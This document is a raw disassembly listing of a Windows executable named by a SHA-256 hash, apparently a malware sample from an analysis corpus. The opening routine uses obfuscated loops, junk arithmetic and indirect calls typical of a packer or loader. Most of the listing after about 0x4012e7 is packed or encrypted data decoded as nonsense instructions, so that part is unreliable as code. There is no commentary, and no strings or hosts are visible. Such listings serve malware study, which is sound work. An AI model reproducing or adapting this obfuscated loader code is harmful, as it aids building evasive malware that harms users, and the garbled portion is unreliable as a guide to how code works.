
88121b1b95243a674bf9f48e2888e4656014072a2827d7e7b962a2672ab99bbd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	ret    
  4012f4:	aas    
  4012f5:	push   esp
  4012f6:	inc    ecx
  4012f7:	jo     0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    eax,DWORD PTR [eax]
  40130c:	lods   al,BYTE PTR ds:[esi]
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	popf   
  4013a8:	mov    al,cl
  4013aa:	sub    DWORD PTR [esi-0x330b73a7],esp
  4013b0:	sbb    eax,0xecf20b96
  4013b5:	cmp    al,0x36
  4013b7:	stos   DWORD PTR es:[edi],eax
  4013b8:	arpl   cx,si
  4013ba:	inc    edi
  4013bb:	ss pop esp
  4013bd:	add    bh,BYTE PTR [ebp+0x1f]
  4013c0:	mov    edi,0xdcfbffc3
  4013c5:	imul   DWORD PTR [esi]
  4013c7:	mov    ch,0x42
  4013c9:	adc    dh,bl
  4013cb:	(bad)  
  4013cc:	stc    
  4013cd:	fldcw  WORD PTR [eax]
  4013cf:	dec    edx
  4013d0:	lods   eax,DWORD PTR ds:[esi]
  4013d1:	xchg   BYTE PTR [ebp+0xf],bl
  4013d4:	rol    DWORD PTR [ebp-0x15],cl
  4013d7:	xchg   ebp,eax
  4013d8:	aam    0x54
  4013da:	xor    dh,al
  4013dc:	mov    ds:0x9f923f7c,al
  4013e1:	ss jmp 0xad367f22
  4013e7:	cli    
  4013e8:	hlt    
  4013e9:	(bad)  
  4013eb:	cmp    esp,DWORD PTR [eax+0x7f58e588]
  4013f1:	into   
  4013f2:	pop    esi
  4013f3:	push   ss
  4013f4:	cmp    dh,ch
  4013f6:	outs   dx,DWORD PTR ds:[esi]
  4013f7:	loope  0x401416
  4013f9:	gs enter 0x976e,0x89
  4013fe:	test   DWORD PTR [edx],ebp
  401400:	xor    eax,0x8afc0ddb
  401405:	cdq    
  401406:	and    eax,0x522530f9
  40140b:	sbb    DWORD PTR [edx],eax
  40140d:	cmp    eax,0x68238458
  401412:	call   0x2e7194f1
  401417:	mov    ecx,0x2dd405b4
  40141c:	jp     0x401427
  40141e:	mov    eax,ds:0xc4acd835
  401423:	out    dx,al
  401424:	not    ebx
  401426:	(bad)  
  401427:	fwait
  401428:	cwde   
  401429:	jmp    0x10c8:0xf7335afd
  401430:	mov    edi,0x303b0c3
  401435:	gs icebp 
  401437:	ficom  DWORD PTR [ecx]
  401439:	sub    BYTE PTR [ebp+0x33cac587],ch
  40143f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401440:	shl    BYTE PTR [eax],0xe5
  401443:	jne    0x4013e9
  401445:	icebp  
  401446:	retf   0x23d3
  401449:	inc    ecx
  40144a:	iret   
  40144b:	ficom  WORD PTR [edi+0x7f8b8bb4]
  401451:	gs push ds
  401453:	les    ecx,FWORD PTR [ecx+0x2b092e86]
  401459:	fistp  WORD PTR [ebp-0x54]
  40145c:	ret    
  40145d:	pop    eax
  40145e:	sub    eax,0x14e2721d
  401463:	lea    eax,[eax-0x12]
  401466:	xchg   edi,eax
  401467:	adc    BYTE PTR ds:0x1062438a,dh
  40146d:	ins    BYTE PTR es:[edi],dx
  40146e:	mov    ds:0xf1499005,al
  401473:	out    dx,al
  401474:	mov    ?,WORD PTR [edi]
  401476:	sub    ch,BYTE PTR [edx+0x1e77d0a4]
  40147c:	push   esp
  40147d:	sbb    DWORD PTR [eax+0x20],ebp
  401480:	and    edx,DWORD PTR [edx]
  401482:	cmp    ebp,esp
  401484:	imul   DWORD PTR [esi+0x14]
  401487:	add    ah,BYTE PTR [eax+0xa42d79b]
  40148d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40148e:	sbb    DWORD PTR [edx+0x3d032038],edx
  401494:	adc    al,0x53
  401496:	pusha  
  401497:	repz push ecx
  401499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40149a:	sbb    edx,DWORD PTR [ebx-0x9]
  40149d:	cmovs  ebp,esp
  4014a0:	mov    bh,BYTE PTR [ebp-0x4b]
  4014a3:	dec    esi
  4014a4:	je     0x4014d8
  4014a6:	out    0xc5,eax
  4014a8:	push   esi
  4014a9:	cwde   
  4014aa:	mov    ah,bl
  4014ac:	arpl   WORD PTR [ecx],di
  4014ae:	and    DWORD PTR [edi+0x35fb3a1a],ebx
  4014b4:	popf   
  4014b5:	fistp  DWORD PTR [ebx]
  4014b7:	stos   DWORD PTR es:[edi],eax
  4014b8:	mov    edi,0xbbb4426a
  4014bd:	dec    eax
  4014be:	mov    ebx,0xf963192a
  4014c3:	ret    
  4014c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014c5:	push   ecx
  4014c6:	mov    bl,cl
  4014c8:	mov    esi,0xc615e6c5
  4014cd:	adc    eax,0xd4cacae1
  4014d2:	push   ecx
  4014d3:	jmp    0x401468
  4014d5:	pop    ebx
  4014d6:	loope  0x40152e
  4014d8:	inc    edx
  4014d9:	push   cs
  4014da:	push   cs
  4014db:	jecxz  0x4014a0
  4014dd:	out    dx,eax
  4014de:	shl    DWORD PTR [eax],1
  4014e0:	icebp  
  4014e1:	lds    eax,FWORD PTR [ebp+eiz*2+0x2e]
  4014e5:	or     BYTE PTR [edx+0x4014179c],ah
  4014eb:	mov    dh,0x6f
  4014ed:	push   esp
  4014ee:	mov    esi,0xa30d2f91
  4014f3:	mov    ds:0xe32b628a,al
  4014f8:	into   
  4014f9:	jle    0x401568
  4014fb:	add    eax,0x66439f86
  401500:	mov    DWORD PTR [ebp-0x4],eax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx+0x2f091fed]
  401516:	arpl   WORD PTR [ecx],bp
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	repnz mov ebx,esi
  401523:	push   0xffffffb2
  401525:	add    BYTE PTR [ecx-0x39],0xb1
  401529:	fadd   st,st(5)
  40152b:	pop    ecx
  40152c:	or     BYTE PTR [ecx-0x3b],ah
  40152f:	adc    eax,0xbe84d015
  401534:	lock add eax,0x225d6330
  40153a:	dec    edx
  40153b:	inc    edx
  40153c:	lea    esp,[eax+0x68e829b5]
  401542:	je     0x401534
  401544:	and    eax,0x73c7c2af
  401549:	xchg   BYTE PTR [ebx-0x28837f8e],dh
  40154f:	inc    edx
  401550:	sbb    ebx,DWORD PTR [ebx-0x708584cb]
  401556:	stc    
  401557:	aam    0x28
  401559:	sub    BYTE PTR [esi+0x2f],ch
  40155c:	push   edx
  40155d:	adc    al,0x8d
  40155f:	out    dx,al
  401560:	adc    al,0x83
  401562:	in     al,dx
  401563:	mov    eax,DWORD PTR [edi]
  401565:	out    0x9,al
  401567:	lods   al,BYTE PTR ds:[esi]
  401568:	mov    cl,0x10
  40156a:	dec    ecx
  40156b:	pop    esi
  40156c:	gs push ebp
  40156e:	mov    dh,0x65
  401570:	call   0xfd0a2252
  401575:	xor    BYTE PTR [edi-0x5af80574],ah
  40157b:	jmp    0x4015b4
  40157d:	icebp  
  40157e:	hlt    
  40157f:	lds    eax,FWORD PTR [eax+0x10]
  401582:	fld    QWORD PTR [ebp-0x17]
  401585:	sbb    al,0x79
  401587:	vpsubd ymm1,ymm5,YMMWORD PTR [edx+ebx*1]
  40158c:	scas   eax,DWORD PTR es:[edi]
  40158d:	je     0x4015a1
  40158f:	pop    esi
  401590:	ds es push ss
  401593:	in     al,0xe2
  401595:	shl    BYTE PTR [ecx],cl
  401597:	push   ebx
  401598:	shl    DWORD PTR [edx-0x1efd42c0],cl
  40159e:	sar    DWORD PTR [edi+0x30325586],cl
  4015a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015a5:	loopne 0x401614
  4015a7:	cmp    esi,0x639910df
  4015ad:	cld    
  4015ae:	fucom  st(1)
  4015b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015b1:	(bad)  
  4015b2:	pop    ss
  4015b3:	mov    ebx,0x3e671e41
  4015b8:	adc    ah,0x68
  4015bb:	int    0xbd
  4015bd:	cmp    DWORD PTR [ebp+0x758f2a83],ecx
  4015c3:	in     eax,dx
  4015c4:	add    cl,BYTE PTR [eax+0x7d]
  4015c7:	nop
  4015c8:	jmp    0x5e0c:0xbee46838
  4015cf:	outs   dx,BYTE PTR ds:[esi]
  4015d0:	ins    BYTE PTR es:[edi],dx
  4015d1:	jb     0x4015d1
  4015d3:	push   esp
  4015d4:	dec    edi
  4015d5:	or     dh,BYTE PTR [edx+ebx*8]
  4015d8:	push   ebp
  4015d9:	outs   dx,BYTE PTR ds:[esi]
  4015da:	pop    ds
  4015db:	inc    ebp
  4015dc:	mov    ebx,0x960a7903
  4015e1:	ja     0x4015c1
  4015e3:	retf   
  4015e4:	ret    0x7698
  4015e7:	pop    edi
  4015e8:	jne    0x401644
  4015ea:	mov    cl,0x1f
  4015ec:	xor    BYTE PTR [ecx+0x3efc2a96],bh
  4015f2:	xchg   edx,eax
  4015f3:	hlt    
  4015f4:	xor    BYTE PTR [eax-0x29a1700],ah
  4015fa:	mov    edx,ebx
  4015fc:	inc    edi
  4015fd:	mov    esi,0xf445d4f0
  401602:	jge    0x401673
  401604:	sti    
  401605:	and    ah,al
  401607:	mov    ah,0xbd
  401609:	sbb    eax,0x568b342b
  40160e:	jbe    0x40167c
  401610:	dec    esp
  401611:	int    0xd3
  401613:	stos   BYTE PTR es:[edi],al
  401614:	sbb    esp,DWORD PTR [edi]
  401616:	fldenv [esi+edi*8-0x4da74099]
  40161d:	int    0x26
  40161f:	adc    BYTE PTR [esi],dh
  401621:	xchg   esp,eax
  401622:	adc    ch,BYTE PTR [ebp+0x29]
  401625:	(bad)  
  401626:	nop
  401627:	loope  0x4015b9
  401629:	or     BYTE PTR [esi-0x703343b],dl
  40162f:	je     0x40169d
  401631:	das    
  401632:	call   0x980c588f
  401637:	jmp    0x401684
  401639:	repnz sbb dl,BYTE PTR ds:0x2274c1bf
  401640:	jmp    0x401698
  401642:	dec    ebp
  401643:	rol    BYTE PTR [ecx+0x2b],0xcb
  401647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401648:	shl    DWORD PTR [edx+0x5f7e669c],cl
  40164e:	adc    ah,BYTE PTR [ecx-0x5f0714b4]
  401654:	lea    ecx,[esi-0x38]
  401657:	jb     0x401647
  401659:	fld    QWORD PTR [edi-0x41231d92]
  40165f:	pmulhw mm2,mm4
  401662:	ss xor al,0xac
  401665:	test   eax,0x5848e32d
  40166a:	js     0x401631
  40166c:	xchg   esp,eax
  40166d:	add    esp,esi
  40166f:	aas    
  401670:	lock frstor [ecx]
  401673:	mov    eax,ds:0xd00f4905
  401678:	fisttp QWORD PTR [esi+0x61b8f626]
  40167e:	mov    DWORD PTR [esi+ebp*4-0x1c],ebx
  401682:	pop    ecx
  401683:	sub    al,0xc6
  401685:	xor    eax,0xe4379fc0
  40168a:	into   
  40168b:	jmp    0xb5bd:0x1f12089
  401692:	add    al,0x2c
  401694:	pop    edi
  401695:	scas   al,BYTE PTR es:[edi]
  401696:	fmul   QWORD PTR [edx]
  401698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401699:	xor    ah,BYTE PTR [edi]
  40169b:	test   BYTE PTR [ecx+0x5f5e1fc0],0xf
  4016a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a3:	xor    ah,ah
  4016a5:	(bad)  
  4016a6:	jne    0x40165c
  4016a8:	fld    DWORD PTR [edi+0x5de14942]
  4016ae:	or     eax,0x697ef79
  4016b3:	retf   
  4016b4:	cli    
  4016b5:	jp     0x40169d
  4016b7:	cmc    
  4016b8:	adc    DWORD PTR [esp+edi*2-0x5a27f567],ebp
  4016bf:	mov    ecx,0x60ebd822
  4016c4:	jne    0x401718
  4016c6:	lahf   
  4016c7:	inc    edx
  4016c8:	das    
  4016c9:	arpl   WORD PTR [edx+0x7d],di
  4016cc:	test   eax,0xfebce54b
  4016d1:	daa    
  4016d2:	(bad)  
  4016d4:	ret    
  4016d5:	mov    al,0x29
  4016d7:	hlt    
  4016d8:	pop    esp
  4016d9:	dec    esp
  4016da:	lock rol BYTE PTR [edx+ebp*1+0x2d],1
  4016df:	sub    bl,bh
  4016e1:	sbb    esi,DWORD PTR [esi+eax*1]
  4016e4:	icebp  
  4016e5:	(bad)  [eax]
  4016e7:	inc    edx
  4016e8:	fcomp  QWORD PTR [edx-0x12]
  4016eb:	in     al,0x61
  4016ed:	xchg   edx,eax
  4016ee:	inc    ebx
  4016ef:	dec    esp
  4016f0:	mov    BYTE PTR [esi],0x1f
  4016f3:	loop   0x401762
  4016f5:	scas   al,BYTE PTR es:[edi]
  4016f6:	cmp    eax,0x485a5697
  4016fb:	sbb    ecx,DWORD PTR [ecx+edi*4]
  4016fe:	fbstp  TBYTE PTR [edi-0x3cc3d03e]
  401704:	xchg   ebx,eax
  401705:	lds    ebp,FWORD PTR [ebx]
  401707:	ja     0x4016a8
  401709:	cdq    
  40170a:	int3   
  40170b:	push   DWORD PTR [ebx]
  40170d:	lds    ebp,FWORD PTR [esi]
  40170f:	dec    eax
  401710:	lock jmp 0xeca0f864
  401716:	ret    0x1e70
  401719:	call   0x7fc500c7
  40171e:	mov    DWORD PTR [edx-0x762fba73],ebp
  401724:	inc    ebp
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	ins    BYTE PTR es:[edi],dx
  401741:	(bad)  
  401742:	aam    0x51
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	mov    ds:0xdad2891e,al
  401751:	fcomp  QWORD PTR [eax]
  401753:	pop    ss
  401754:	rol    dh,0x9
  401757:	mov    ebp,0x79b7c66f
  40175c:	enter  0x2973,0xec
  401760:	push   eax
  401761:	mov    ebx,DWORD PTR [ecx+0x76]
  401764:	icebp  
  401765:	sub    bl,BYTE PTR [eax-0x7b]
  401768:	cmp    eax,0xe9674142
  40176d:	jo     0x4017d9
  40176f:	cmp    BYTE PTR [ebp+0x31],bh
  401772:	fnstsw WORD PTR [ebx+0x4ddc7c56]
  401778:	ffreep st(1)
  40177a:	sub    ecx,esi
  40177c:	xchg   bh,al
  40177e:	lods   al,BYTE PTR ds:[esi]
  40177f:	adc    al,0xa1
  401781:	sti    
  401782:	(bad)  
  401783:	and    BYTE PTR [esi],cl
  401785:	jbe    0x4017eb
  401787:	jbe    0x401794
  401789:	call   0x4a75ee52
  40178e:	fs pushf 
  401790:	adc    eax,0x421798ef
  401795:	push   0x5e
  401797:	imul   edi,DWORD PTR [esi-0x16c9db5],0x5ae2558f
  4017a1:	pusha  
  4017a2:	into   
  4017a3:	mov    edx,edi
  4017a5:	sar    DWORD PTR [eax],1
  4017a7:	add    dh,bl
  4017a9:	lahf   
  4017aa:	pop    esi
  4017ab:	clc    
  4017ac:	test   al,0xd9
  4017ae:	lods   eax,DWORD PTR ds:[esi]
  4017af:	xchg   esi,eax
  4017b0:	inc    ecx
  4017b1:	xchg   esp,eax
  4017b2:	call   0xa2b5:0x305500ba
  4017b9:	pop    esi
  4017ba:	add    bl,bh
  4017bc:	push   cs
  4017bd:	push   0x15c93065
  4017c2:	pop    ebx
  4017c3:	aas    
  4017c4:	je     0x401805
  4017c6:	cmc    
  4017c7:	aad    0xb5
  4017c9:	clc    
  4017ca:	cmp    eax,0x9b5b624e
  4017cf:	mov    ecx,0x247fa3de
  4017d4:	and    ebx,DWORD PTR [ebx-0x1315bf01]
  4017da:	pushf  
  4017db:	jge    0x40176e
  4017dd:	xchg   ebx,eax
  4017de:	aam    0x93
  4017e0:	lods   al,BYTE PTR ds:[esi]
  4017e1:	xor    BYTE PTR [edi],cl
  4017e3:	ror    ebx,1
  4017e5:	(bad)  [ebx]
  4017e7:	jns    0x401842
  4017e9:	gs jne 0x40178c
  4017ec:	sub    ch,BYTE PTR [ebp+0x6f]
  4017ef:	cmc    
  4017f0:	jmp    0x328eeaf5
  4017f5:	dec    esi
  4017f6:	fist   WORD PTR [edi+0x281be2e9]
  4017fc:	pop    edi
  4017fd:	add    al,0x19
  4017ff:	stos   DWORD PTR es:[edi],eax
  401800:	add    al,0x81
  401802:	cmp    DWORD PTR [eax+edi*4+0x42],0x67ce9008
  40180a:	or     al,0xef
  40180c:	cmp    ebx,ebx
  40180e:	sti    
  40180f:	imul   edi,DWORD PTR [esi],0x1772171e
  401815:	test   al,0xa
  401817:	test   al,0xbd
  401819:	call   FWORD PTR [edi]
  40181b:	jge    0x4017b8
  40181d:	adc    ch,BYTE PTR [ebx]
  40181f:	lds    ebx,FWORD PTR [ebp-0x52466fcb]
  401825:	inc    esi
  401826:	(bad)  
  401827:	stc    
  401828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401829:	pop    ds
  40182a:	inc    eax
  40182b:	sbb    DWORD PTR [ebx-0x5b9da553],ebp
  401831:	das    
  401832:	outs   dx,BYTE PTR ds:[esi]
  401833:	loopne 0x401885
  401835:	daa    
  401836:	push   edx
  401837:	outs   dx,BYTE PTR ds:[esi]
  401838:	mov    cl,0xe
  40183a:	lea    ebp,[edi+0x21766ec2]
  401840:	push   esi
  401841:	pop    eax
  401842:	mov    al,0xcc
  401844:	sbb    al,0x7a
  401846:	neg    esp
  401848:	loope  0x4018b1
  40184a:	dec    edx
  40184b:	stos   BYTE PTR es:[edi],al
  40184c:	fdivr  QWORD PTR [ebp+0x66a01826]
  401852:	fcomp  DWORD PTR [ebx+0x78]
  401855:	sub    bh,BYTE PTR [esi+0x15]
  401858:	sub    eax,0xa03ff12d
  40185d:	pop    es
  40185e:	je     0x401884
  401860:	mov    bh,0x7a
  401862:	xor    al,0x57
  401864:	mov    esi,0x4e3c1a61
  401869:	xor    ebp,DWORD PTR [edi-0x7d3d4837]
  40186f:	in     eax,dx
  401870:	add    al,0x8d
  401872:	fwait
  401873:	imul   esp,DWORD PTR [esi+0x67],0x64
  401877:	loope  0x401887
  401879:	iret   
  40187a:	jne    0x401897
  40187c:	add    esp,edx
  40187e:	mov    ds:0x20aaf1ed,al
  401883:	mov    ebp,0xa97390ec
  401888:	pop    esp
  401889:	or     bh,ah
  40188b:	cmovns ebp,DWORD PTR [edi]
  40188e:	aad    0xbb
  401890:	mov    bl,0x82
  401892:	and    DWORD PTR [edi-0x34bec5f2],ecx
  401898:	xchg   DWORD PTR ds:0xead7bbc3,esi
  40189e:	std    
  40189f:	xor    eax,0x186fd5f3
  4018a4:	or     eax,0x276e7c7c
  4018a9:	lods   al,BYTE PTR ds:[esi]
  4018aa:	mov    al,0xfc
  4018ac:	fld    DWORD PTR [eax+0x36d2dd2]
  4018b2:	(bad)  [edi+0x2a5ce384]
  4018b8:	sub    esp,DWORD PTR [eax+0x5ebec5c8]
  4018be:	test   BYTE PTR [ebp+0x13],ah
  4018c1:	stos   DWORD PTR es:[edi],eax
  4018c2:	iret   
  4018c3:	jp     0x4018f6
  4018c5:	and    eax,0xb8c7d6
  4018ca:	leave  
  4018cb:	jp     0x401931
  4018cd:	pop    ecx
  4018ce:	ret    0x7261
  4018d1:	xchg   ecx,eax
  4018d2:	cmp    ch,BYTE PTR [esi]
  4018d4:	inc    edi
  4018d5:	fnstenv [ebx]
  4018d7:	mov    al,bh
  4018d9:	cmp    al,0x13
  4018db:	je     0x401958
  4018dd:	lods   al,BYTE PTR ds:[esi]
  4018de:	xchg   ebp,eax
  4018df:	jmp    0xbd9dcbbb
  4018e4:	fldcw  WORD PTR [ebp+0x77a632e2]
  4018ea:	(bad)  
  4018eb:	stos   DWORD PTR es:[edi],eax
  4018ec:	sub    BYTE PTR [edi+0x3c],dh
  4018ef:	xchg   BYTE PTR ds:0x7cc838ba,dh
  4018f5:	imul   ebp,DWORD PTR [ebp-0xa0566d6],0x42001033
  4018ff:	lahf   
  401900:	pop    es
  401901:	hlt    
  401902:	pushf  
  401903:	adc    eax,0x8e0ca7c8
  401908:	and    esp,DWORD PTR [esi-0x71]
  40190b:	sub    eax,0xd1f63002
